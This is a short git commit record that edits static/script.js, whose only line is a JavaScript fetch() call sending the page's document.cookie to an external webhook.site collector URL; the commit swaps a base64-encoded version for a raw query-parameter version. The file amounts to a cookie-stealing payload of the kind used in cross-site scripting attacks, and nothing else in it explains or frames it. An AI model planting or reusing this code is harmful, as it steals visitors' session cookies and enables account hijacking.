00f45cfe1e00c89003c5739f1b0a1f8d1ee43e2a
HanX2017 <154918263+HanX2017@users.noreply.github.com>
2025-08-12 00:52:06 +0800

    Update script.js

--- static/script.js
+++ static/script.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/ae45bf46-4c24-4e26-9704-986cfbe83d6a/foo?="+window.btoa(document.cookie));
+fetch("https://webhook.site/ae45bf46-4c24-4e26-9704-986cfbe83d6a?cookie=" + document.cookie)
